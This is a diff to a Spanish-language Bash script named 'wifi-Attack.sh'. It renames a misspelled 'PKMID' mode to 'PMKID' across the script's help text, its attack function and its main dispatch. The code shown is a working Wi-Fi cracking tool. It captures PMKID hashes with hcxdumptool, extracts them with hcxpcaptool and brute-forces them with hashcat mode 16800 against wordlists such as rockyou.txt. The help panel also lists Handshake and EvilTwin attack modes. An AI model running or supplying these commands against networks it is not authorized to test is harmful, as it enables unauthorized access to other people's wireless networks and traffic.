@@ -39,9 +39,9 @@ function help_panel(){
 	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}Hanshake${end} ${purple}-i${end} ${cyan}wlan0${end}"
 	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}Hanshake${end} ${purple}-i${end} ${cyan}wlan0${end} ${purple}-w${end} ${cyan}wordlist${end}"
 
-	echo -e "${cyan}\t\tPKMID${end}"
-	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}PKMID${end} ${purple}-i${end} ${cyan}wlan0${end}"
-	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}PKMID${end} ${purple}-i${end} ${cyan}wlan0${end} ${purple}-w${end} ${cyan}wordlist${end}"
+	echo -e "${cyan}\t\tPMKID${end}"
+	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}PMKID${end} ${purple}-i${end} ${cyan}wlan0${end}"
+	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}PMKID${end} ${purple}-i${end} ${cyan}wlan0${end} ${purple}-w${end} ${cyan}wordlist${end}"
 
 	echo -e "${cyan}\t\tEvilTwin${end}"
 	echo -e "\t\t\t${blue} ./wifi-Attack.sh ${end}${purple}-m${end} ${cyan}EvilTwin${end} ${purple}-i${end} ${cyan}wlan0${end}"
@@ -161,19 +161,19 @@ function attack_handshake(){
 		fi
 	fi
 }
-function attack_pkmid(){
-	echo -e "${blue}[]${end}${cyan} Comenzando ataque PKMID...${end}"
+function attack_pmkid(){
+	echo -e "${blue}[]${end}${cyan} Comenzando ataque PMKID...${end}"
 	mkdir handshake_pcap 2>/dev/null
 	sleep 2
-	timeout 60 bash -c "hcxdumptool -i ${interface_set}mon --enable_status=1 -o captura_pkmid"
+	timeout 60 bash -c "hcxdumptool -i ${interface_set}mon --enable_status=1 -o captura_pmkid"
 	echo -e "${blue}[]${end}${yellow} Obteniendo hashes de la captura pcap...${end}"
-	hcxpcaptool -z handshake_pcap/hashes_pkmid captura_pkmid 2>/dev/null
-	rm captura_pkmid 2>/dev/null
-	test -f handshake_pcap/hashes_pkmid
+	hcxpcaptool -z handshake_pcap/hashes_pmkid captura_pmkid 2>/dev/null
+	rm captura_pmkid 2>/dev/null
+	test -f handshake_pcap/hashes_pmkid
 	if [[ $? -eq 0 ]]; then
 		if [[ $dictionary != "" ]]; then
 	                echo -e "${white}[]${end}${green} Comenzando ataque de fuerza bruta!...${end}"
-	                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pkmid $dictionary" &
+	                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pmkid $dictionary" &
 	        else
 	                option=""
 	                tput cnorm
@@ -187,11 +187,11 @@ function attack_pkmid(){
 	                tput civis
 
 	                if [[ option -eq 1 ]]; then
-		                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pkmid $dictionary /usr/share/wordlists/rockyou.txt" &
+		                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pmkid $dictionary /usr/share/wordlists/rockyou.txt" &
 	                elif [[ option -eq 2 ]]; then
         	                tput cnorm
 	                        echo -ne "\n${blue}[]${end}${yellow} Ingrese la ruta de su diccionario: ${end}" && read dir_dicc
-		                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pkmid $dir_dicc" &
+		                xterm -hold -bg \#2C2C2C -fg \#FFFFFF -T "Fuerza bruta" -geometry 130x35 -e "hashcat -a 0 -m 16800 handshake_pcap/hashes_pmkid $dir_dicc" &
 	                        tput civis
 	                else
 	                        echo -e "${red}[] Parametro incorrecto!...${end}"
@@ -357,12 +357,12 @@ if [ $(id -u) == "0" ]; then
 
 			# Parando la tarjeta en modo
 			stop_attack
-		elif [[ $attack == "PKMID" && $interface != "" ]]; then
-			rm handshake_pcap/hashes_pkmid 2>/dev/null
+		elif [[ $attack == "PMKID" && $interface != "" ]]; then
+			rm handshake_pcap/hashes_pmkid 2>/dev/null
 
 			#comenzando ataque
 			attack_ini # Configurando tarjeta de red
-			attack_pkmid
+			attack_pmkid
 
 			# Parando la tarjeta en modo
 			stop_attack
